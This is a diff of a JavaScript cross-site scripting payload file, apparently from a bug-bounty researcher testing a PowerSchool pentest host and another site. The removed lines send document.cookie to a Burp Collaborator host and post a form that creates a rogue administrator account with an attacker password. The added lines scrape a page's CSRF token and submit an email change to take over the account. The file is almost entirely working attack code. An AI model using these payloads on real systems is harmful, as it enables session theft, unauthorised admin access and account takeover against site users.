@@ -1,30 +1,44 @@
-window.open("https://pentest.sfe.powerschool.com/profileMainNewInitAction.do");
-alert(document.cookie);
-alert(document.domain);
-function stealCookies(){
-  const url = 'https://kc0uextit85igfq9a8t1015ei5ovck.burpcollaborator.net/?cookies=' + btoa(document.cookie)
-  const response = fetch(url)
-}
+fetch('https://www.dfdfd.com/') // 确保替换为目标网站正确的URL
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Network response was not ok');
+        }
+        return response.text(); // 获取响应文本
+    })
+    .then(data => {
+        // 创建一个新的DOM解析器实例
+        const parser = new DOMParser();
+        // 解析字符串为HTML文档
+        const doc = parser.parseFromString(data, 'text/html');
+        // 查找包含csrf_token的input元素
+        const csrfTokenElement = doc.querySelector('input[name="csrf_token"]');
+        if (csrfTokenElement) {
+            // 提取value属性值
+            const csrfToken = csrfTokenElement.getAttribute('value');
+            console.log('CSRF Token:', csrfToken);
+            let formData = new FormData();
+            formData.append('_charset_', 'UTF-8');
+            formData.append('__formid__', 'deform');
+            formData.append('csrf_token', csrfToken);
+            formData.append('newemail', 'esperamier+xss1@intigriti.me');
+            formData.append('request', 'request');
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    // 注意：使用FormData时，不需要手动设置Content-Type头部，浏览器会自动设置
+                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
+                },
+                body: formData,
+            })
+            .then(response => response.text())
+            .then(data => console.log(data))
+            .catch(error => console.error('Error:', error));
+        } else {
+            console.error('CSRF token not found.');
+        }
+    })
+    .catch(error => {
+        console.error('There has been a problem with your fetch operation:', error);
+    });
 
-function getCookie(cname)
-{
-  var name = cname + "=";
-  var ca = document.cookie.split(';');
-  for(var i=0; i<ca.length; i++) 
-  {
-    var c = ca[i].trim();
-    if (c.indexOf(name)==0) return c.substring(name.length,c.length);
-  }
-  return "";
-}
-
-
-// add new administrator account
-var httpRequest = new XMLHttpRequest();//
-
-
-httpRequest.open('POST', 'https://pentest.sfe.powerschool.com/profileMainAction.do', true); 
-httpRequest.setRequestHeader("Content-type","application/x-www-form-urlencoded");
-httpRequest.send('employeeSearchId=&accessIdStr=9999&webPassword=AttackerMe!1&lastName=attacker&firstName=John&email=esperamier%40bugcrowdninja.com&pin=&externalId=&customField1=&customField2=&customField3=&customField4=&customField5=&customField6=&customField7=&customField8=&phone1=2126909455&addressLn1=1870+Oakwood+Avenue&addressLn2=&city=New+York&state=NY&zip=10031&genderCd=0&ethnicityCd=0&languageId=1&roleAdm=on&activeAdm=on&calendarId=-99&disableJobShopping=false&callBackNumber=&submitInsert=Save');//发送请求 将情头体写在send中
-
-stealCookies();
